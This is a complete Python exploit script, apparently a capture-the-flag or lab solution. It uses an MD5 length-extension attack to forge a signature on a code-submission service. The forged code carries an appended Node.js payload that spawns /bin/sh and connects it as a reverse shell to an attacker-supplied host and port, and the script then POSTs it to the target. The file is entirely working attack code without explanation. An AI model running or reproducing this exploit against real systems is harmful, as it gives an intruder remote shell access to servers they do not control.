from pymd5 import md5, padding
import requests
import base64
import sys

if len(sys.argv) != 4:
    print('Usage: python {} <target> <lhost> <lport>'.format(sys.argv[0]))
    print('E.g.:  python {} 192.168.1.128 192.168.1.2 4444'.format(sys.argv[0]))
    sys.exit(1)

TARGET = sys.argv[1]
LHOST = sys.argv[2]
LPORT = sys.argv[3]

code = b"""function hello(name) {
  return 'Hello ' + name + '!';
}

hello('World'); // should print 'Hello World'"""
extra = """
(function() {{
    var net = require('net'),
        cp = require('child_process'),
        sh = cp.spawn('/bin/sh', []);
    var client = new net.Socket();
    client.connect({}, '{}', function(){{
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    }});
    return /a/; // Prevents the Node.js application form crashing
}})()""".format(LPORT, LHOST).encode('utf-8')
extended_code = code + padding((len('xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx') + len('|') + len(code))*8) + extra
sig = 'aaa8111b4871b48dc6c0ac4c33ef9e1b'

extended_hash = md5(state=bytes.fromhex(sig), count=1536)
extended_hash.update(extra)
extended_sig = extended_hash.hexdigest()

r = requests.post('http://{}'.format(TARGET), json={
    'code': base64.b64encode(extended_code).decode('utf-8'),
    'sig': extended_sig
})
print('Status code: {}'.format(r.status_code))
print('Response: {}'.format(r.text))
